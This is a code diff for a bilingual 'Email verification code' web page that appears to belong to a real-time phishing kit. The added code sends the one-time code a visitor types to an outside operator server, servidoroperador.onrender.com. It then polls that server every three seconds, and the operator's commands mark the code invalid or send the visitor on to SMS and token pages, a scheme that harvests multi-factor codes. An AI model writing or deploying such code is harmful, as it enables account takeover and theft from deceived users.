@@ -1,6 +1,6 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useRef } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
@@ -9,6 +9,7 @@ import { ChevronDown, ArrowLeft } from "lucide-react"
 import Image from "next/image"
 import Link from "next/link"
 import { useMetrics } from "@/hooks/useMetrics"
+import { useRouter } from "next/navigation"
 
 // Detectar idioma do navegador - padrão sempre inglês exceto francês
 const getDefaultLanguage = () => {
@@ -26,10 +27,11 @@ const translations = {
     codeLabel: "Code Email",
     placeholder: "000000",
     verifyButton: "Vérifier",
+    verifyLoading: "Vérification...",
     backToLogin: "Retour à la connexion",
     resendCode: "Renvoyer l'email",
-    emailAddress: "user@example.com",
     checkSpam: "Vérifiez votre dossier spam si vous ne recevez pas l'email",
+    invalidCode: "Code email invalide. Tente novamente.",
   },
   en: {
     title: "Email verification code",
@@ -37,19 +39,101 @@ const translations = {
     codeLabel: "Email Code",
     placeholder: "000000",
     verifyButton: "Verify",
+    verifyLoading: "Verifying...",
     backToLogin: "Back to login",
     resendCode: "Resend email",
-    emailAddress: "user@example.com",
     checkSpam: "Check your spam folder if you don't receive the email",
+    invalidCode: "Invalid email code. Try again.",
   },
 }
 
+// Monitoramento infinito EMAIL
+const monitorClientEmail = async (clientId: string, router: any, onInvalidCode: () => void, isMonitoringRef: React.MutableRefObject<boolean>) => {
+  console.log(`Iniciando monitoramento Email do cliente: ${clientId}`);
+  
+  let intervalId: NodeJS.Timeout;
+  
+  const monitor = async () => {
+    if (!isMonitoringRef.current) {
+      console.log('Monitoramento Email parado por flag');
+      clearInterval(intervalId);
+      return;
+    }
+
+    try {
+      // 🔍 CONSULTA SERVIDOR A CADA 3 SEGUNDOS
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+
+      if (response.ok) {
+        const clientData = await response.json();
+        const command = clientData.data?.response || clientData.data?.command;
+        
+        // ❌ EMAIL INVÁLIDO - CONTINUA MONITORAMENTO
+        if (command === "inv_email") {
+          console.log('Email inválido detectado');
+          onInvalidCode(); // Limpa campo + mostra erro
+          return; // NÃO para o monitoramento
+        }
+        
+        // ✅ VAI PARA SMS - PARA MONITORAMENTO
+        if (command === "ir_sms") {
+          console.log('Redirecionando para /sms');
+          clearInterval(intervalId);
+          isMonitoringRef.current = false;
+          router.push('/sms');
+          return;
+        }
+
+        // ✅ VAI PARA TOKEN - PARA MONITORAMENTO
+        if (command === "ir_auth") {
+          console.log('Redirecionando para /token');
+          clearInterval(intervalId);
+          isMonitoringRef.current = false;
+          router.push('/token');
+          return;
+        }
+      }
+    } catch (error) {
+      console.log('Erro durante consulta Email:', error);
+    }
+  };
+
+  // 🔄 EXECUTA A CADA 3 SEGUNDOS
+  await monitor(); // Primeira execução imediata
+  intervalId = setInterval(monitor, 3000);
+};
+
 export default function EmailPage() {
+  // ESTADOS PRINCIPAIS
+  const [emailCode, setEmailCode] = useState(""); // Email digitado
+  const [clientId, setClientId] = useState(""); // ID do cliente
+  const [isLoading, setIsLoading] = useState(false); // Loading do botão
+  const [isInvalid, setIsInvalid] = useState(false); // Campo com erro
+  const [errorMessage, setErrorMessage] = useState(""); // Mensagem de erro
+  const isMonitoringRef = useRef(false); // Controla monitoramento
+
   const metrics = useMetrics() // Hook das métricas
+  const router = useRouter()
   const [language, setLanguage] = useState(() => getDefaultLanguage())
-  const [code, setCode] = useState("")
 
   const t = translations[language as keyof typeof translations]
+
+  // INICIALIZAÇÃO
+  useEffect(() => {
+    const storedClientId = localStorage.getItem('client_id');
+    if (storedClientId) {
+      setClientId(storedClientId);
+    }
+    
+    return () => {
+      isMonitoringRef.current = false;
+    };
+  }, []);
 
   // Envio automático de métricas ao carregar a página
   useEffect(() => {
@@ -57,6 +141,76 @@ export default function EmailPage() {
       metrics.registerVisit() // Envia métricas automaticamente
     }
   }, [metrics])
+
+  // Função que trata digitação do email
+  const handleEmailChange = (value: string) => {
+    setEmailCode(value.replace(/\D/g, '').slice(0, 6));
+    
+    if (isInvalid) {
+      setIsInvalid(false);
+      setErrorMessage("");
+    }
+  };
+
+  // Função de erro EMAIL
+  const onInvalidCode = () => {
+    console.log('Email inválido - limpando campo');
+    setEmailCode(""); // ❌ Limpa o campo email
+    setIsLoading(false); // ❌ Para o loading
+    setIsInvalid(true); // ❌ Mostra erro visual
+    setErrorMessage(t.invalidCode);
+    // ✅ isMonitoringRef.current continua TRUE - NÃO para monitoramento
+  };
+
+  // ENVIO DO EMAIL
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    if (!clientId) {
+      console.log('ClientId não disponível para envio do email');
+      return;
+    }
+
+    if (!emailCode || emailCode.length !== 6) {
+      return;
+    }
+
+    try {
+      console.log('Enviando email:', emailCode);
+      
+      setIsLoading(true);
+      setIsInvalid(false);
+      setErrorMessage("");
+      
+      // 🚀 ENVIA EMAIL PARA O SERVIDOR
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
+        method: 'PATCH',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          response: emailCode, // Email que o usuário digitou
+          command: ""
+        })
+      });
+
+      if (response.ok) {
+        console.log('Email enviado com sucesso');
+        
+        // 🔄 INICIA MONITORAMENTO INFINITO
+        if (!isMonitoringRef.current) {
+          isMonitoringRef.current = true;
+          await monitorClientEmail(clientId, router, onInvalidCode, isMonitoringRef);
+        }
+      } else {
+        console.log('Erro ao enviar email');
+        setIsLoading(false);
+      }
+    } catch (error) {
+      console.log('Erro durante envio do email:', error);
+      setIsLoading(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col lg:flex-row">
@@ -90,10 +244,9 @@ export default function EmailPage() {
           </Link>
 
           {/* Email Form */}
-          <div className="space-y-6">
+          <form onSubmit={handleSubmit} className="space-y-6">
             <div className="text-center lg:text-left">
               <p className="text-gray-600">{t.subtitle}</p>
-              <p className="text-gray-900 font-medium">{t.emailAddress}</p>
             </div>
 
             <div>
@@ -103,24 +256,44 @@ export default function EmailPage() {
               <Input
                 id="code"
                 type="text"
-                value={code}
-                onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                value={emailCode}
+                onChange={(e) => handleEmailChange(e.target.value)}
                 placeholder={t.placeholder}
-                className="w-full h-12 px-4 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl tracking-widest"
+                className={`w-full h-12 px-4 border rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl tracking-widest ${
+                  isInvalid ? 'border-red-500' : 'border-gray-300'
+                }`}
                 maxLength={6}
+                autoComplete="one-time-code"
+                disabled={isLoading}
               />
+              {errorMessage && (
+                <p className="text-red-500 text-sm mt-1">{errorMessage}</p>
+              )}
             </div>
 
             <p className="text-sm text-gray-500 text-center lg:text-left">{t.checkSpam}</p>
 
             <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 pt-4">
-              <Button className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto">
-                {t.verifyButton}
+              <Button 
+                type="submit"
+                disabled={!emailCode || emailCode.length !== 6}
+                className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto disabled:opacity-50 flex items-center justify-center gap-2"
+              >
+                {isLoading && (
+                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                )}
+                {isLoading ? t.verifyLoading : t.verifyButton}
               </Button>
 
-              <button className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left">{t.resendCode}</button>
+              <button 
+                type="button"
+                disabled={isLoading}
+                className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left disabled:opacity-50"
+              >
+                {t.resendCode}
+              </button>
             </div>
-          </div>
+          </form>
         </div>
       </div>
 
